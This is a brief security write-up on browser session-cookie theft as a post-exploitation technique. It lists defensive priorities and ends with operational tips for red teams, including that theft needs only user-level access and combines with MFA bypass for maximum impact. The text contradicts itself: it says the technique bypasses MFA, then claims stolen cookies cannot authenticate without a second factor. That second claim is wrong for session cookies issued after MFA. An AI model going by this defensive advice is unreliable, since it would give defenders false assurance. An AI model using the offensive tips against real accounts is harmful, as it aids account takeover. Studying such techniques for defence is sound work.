Browser cookie collection is a **high-impact, low-risk** post-exploitation technique that bypasses authentication and MFA by leveraging browser session tokens. The technique is **ACTIVE** and remains challenging to defend against given the ubiquity of web application access in modern enterprise environments.

**Key Defense Priorities:**
1. **Deploy MFA everywhere** - Even stolen cookies cannot authenticate without second factor
2. **Enable Conditional Access policies** - Detect anomalous signin locations/impossible travel
3. **Monitor browser data directory access** - Alert on unauthorized file reads
4. **Enforce HTTPS-only mode and HSTS** - Prevent man-in-the-middle interception
5. **Disable browser password storage** - Reduce credential exposure surface

**Operational Notes for Red Teams:**
- Browser cookie extraction requires only user-level access (no elevation needed)
- Cookies are valid for days/weeks; long window for attacker abuse
- Session isolation (browser containers, device compliance) can mitigate but not eliminate risk
- Combine with MFA bypass techniques for maximum impact

---